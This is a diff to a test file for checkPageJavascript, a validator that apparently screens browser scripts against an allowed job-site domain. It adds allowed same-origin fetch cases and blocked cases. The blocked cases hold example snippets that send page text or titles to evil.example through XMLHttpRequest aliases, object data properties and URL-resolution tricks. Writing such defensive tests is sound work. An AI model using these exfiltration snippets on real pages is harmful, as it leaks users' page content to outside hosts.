@@ -46,6 +46,13 @@ describe("checkPageJavascript: code that only reads or stays on the allowed site
     "const rows = []; rows.href = x; rows",
     "document.querySelector('.jd').constructor.name",
     "el.innerHTML = '<b>Senior engineer</b> with <i>one</i> offer'",
+    // Same-origin URLs built against the page's own location.
+    "await fetch(new URL('/api/jobs?page=2', location.origin))",
+    "await fetch(new URL('/api/jobs', location.href))",
+    "await fetch(new URL('/api/x', window.location.origin).href)",
+    "await fetch(new URL('?page=3', document.baseURI))",
+    "indexedDB.open('cache', 2)",
+    "document.body.background = '/static/bg.png'",
     "new WebSocket('wss://www.topcv.vn/socket')",
   ];
   it.each(allowed)("allows: %s", (code) => {
@@ -127,6 +134,22 @@ describe("checkPageJavascript: requests and resources off the allowed sites", ()
     ["form.action = 'https://evil.example/collect'", "js_host"],
     ["el.style.background = 'url(https://evil.example/x?' + d + ')'", "js_host"],
     ["el.setAttribute('onclick', 'alert(1)')", "js_event_handler"],
+    // XMLHttpRequest whatever the method argument looks like, and through aliases.
+    ["const x = new XMLHttpRequest(); x.open(['POST'][0], 'https://evil.example/collect'); x.send(document.body.innerText)", "js_host"],
+    [
+      "const x = new XMLHttpRequest(); x.open('GET'.toLowerCase(), 'https://evil.example/c?d=' + encodeURIComponent(document.title)); x.send()",
+      "js_host",
+    ],
+    ["const x = new XMLHttpRequest(); const o = x.open; o.call(x, 'POST', 'https://evil.example')", "js_host"],
+    ["XMLHttpRequest.prototype.open.call(x, 'POST', 'https://evil.example')", "js_host"],
+    // Element properties that load a URL.
+    ["document.querySelector('object').data = 'https://evil.example/x?d=' + document.title", "js_host"],
+    ["el.background = 'https://evil.example/p'", "js_host"],
+    ["el.codeBase = 'https://evil.example/'", "js_host"],
+    // new URL(path, base) resolves like the browser does.
+    ["fetch(new URL('//evil.example/x', location.origin))", "js_host"],
+    ["fetch(new URL('/x', 'https://evil.example'))", "js_host"],
+    ["fetch(new URL('/x', someBase))", "js_unverifiable_url"],
   ];
   it.each(blocked)("blocks: %s", (code, rule) => {
     const decision = checkPageJavascript(code, ALLOW);
